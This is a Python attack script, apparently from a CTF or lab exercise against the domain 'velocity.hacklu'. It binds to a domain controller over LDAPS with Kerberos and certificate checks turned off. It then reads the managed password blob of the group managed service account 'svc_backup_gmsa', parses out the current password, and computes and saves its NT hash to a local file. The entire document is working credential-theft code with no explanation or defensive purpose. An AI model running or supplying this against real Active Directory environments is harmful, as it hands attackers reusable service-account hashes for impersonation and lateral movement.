import os, ssl
from ldap3 import Connection, Server, Tls, SASL, GSSAPI, NONE, BASE
from Crypto.Hash import MD4

server=Server('10.244.0.10',port=636,use_ssl=True,tls=Tls(validate=ssl.CERT_NONE),connect_timeout=12,get_info=NONE)
c=Connection(server,authentication=SASL,sasl_mechanism=GSSAPI,sasl_credentials=('dc-new.velocity.hacklu',),receive_timeout=20)
print('bind',c.bind(),c.result,flush=True)
dn='CN=svc_backup_gmsa,CN=Managed Service Accounts,DC=velocity,DC=hacklu'
print('search',c.search(dn,'(objectClass=msDS-GroupManagedServiceAccount)',search_scope=BASE,attributes=['sAMAccountName','msDS-ManagedPassword']),c.result,flush=True)
if not c.entries:
 raise SystemExit('gMSA entry not returned')
e=c.entries[0]
print('account',e.entry_attributes_as_dict.get('sAMAccountName'),flush=True)
raws=e.entry_raw_attributes.get('msDS-ManagedPassword',[])
print('managedPassword attribute count',len(raws),'lengths',[len(x) for x in raws],flush=True)
if not raws:
 raise SystemExit('managedPassword was not returned')
raw=raws[0]
version,reserved,total_len,current_off,previous_off,query_off,unchanged_off=__import__('struct').unpack_from('<HHIHHHH',raw)
current_end=previous_off or query_off
password_bytes=raw[current_off:current_end-2]
h=MD4.new();h.update(password_bytes)
out='/tmp/ad13-ma.VDTOko/svc_backup_gmsa.nthash'
with open(out,'w',encoding='ascii') as f:f.write(h.hexdigest())
os.chmod(out,0o600)
print('gMSA password retrieved; password-bytes',len(password_bytes),'NT hash stored locally',flush=True)
c.unbind()
